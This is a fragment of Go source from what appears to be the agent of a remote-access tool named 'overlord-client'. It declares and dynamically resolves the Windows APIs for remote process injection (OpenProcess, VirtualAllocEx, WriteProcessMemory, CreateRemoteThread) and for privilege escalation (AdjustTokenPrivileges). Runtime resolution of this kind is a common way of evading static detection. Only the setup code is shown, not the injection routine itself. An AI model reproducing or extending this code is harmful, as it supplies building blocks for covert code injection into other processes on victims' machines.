...
import (
	...
	"overlord-client/cmd/agent/winapi"
)

var (
	procOpenProcess           *syscall.Proc
	procVirtualAllocEx        *syscall.Proc
	procWriteProcessMemory    *syscall.Proc
	procCreateRemoteThread    *syscall.Proc
	procWaitForSingleObject   *syscall.Proc
	procCloseHandle           *syscall.Proc
	procResumeThread          *syscall.Proc
	procGetExitCodeThread     *syscall.Proc
	procOpenProcessToken      *syscall.Proc
	procLookupPrivilegeValueW *syscall.Proc
	procAdjustTokenPrivileges *syscall.Proc
	procCreateFileMappingW    *syscall.Proc
	procMapViewOfFile         *syscall.Proc
	procUnmapViewOfFile       *syscall.Proc
	procGetExitCodeProcess    *syscall.Proc
	injectAPIsOnce            sync.Once
)

func resolveInjectAPIs() {
	injectAPIsOnce.Do(func() {
		procOpenProcess, _ = winapi.GetProc("kernel32.dll", "OpenProcess")
		procVirtualAllocEx, _ = winapi.GetProc("kernel32.dll", "VirtualAllocEx")
		procWriteProcessMemory, _ = winapi.GetProc("kernel32.dll", "WriteProcessMemory")
		procCreateRemoteThread, _ = winapi.GetProc("kernel32.dll", "CreateRemoteThread")
		procWaitForSingleObject, _ = winapi.GetProc("kernel32.dll", "WaitForSingleObject")
		procCloseHandle, _ = winapi.GetProc("kernel32.dll", "CloseHandle")
		procResumeThread, _ = winapi.GetProc("kernel32.dll", "ResumeThread")
		procGetExitCodeThread, _ = winapi.GetProc("kernel32.dll", "GetExitCodeThread")
		procOpenProcessToken, _ = winapi.GetProc("advapi32.dll", "OpenProcessToken")
		procLookupPrivilegeValueW, _ = winapi.GetProc("advapi32.dll", "LookupPrivilegeValueW")
		procAdjustTokenPrivileges, _ = winapi.GetProc("advapi32.dll", "AdjustTokenPrivileges")
		procCreateFileMappingW, _ = winapi.GetProc("kernel32.dll", "CreateFileMappingW")
		procMapViewOfFile, _ = winapi.GetProc("kernel32.dll", "MapViewOfFile")
		procUnmapViewOfFile, _ = winapi.GetProc("kernel32.dll", "UnmapViewOfFile")
		procGetExitCodeProcess, _ = winapi.GetProc("kernel32.dll", "GetExitCodeProcess")
	})
}
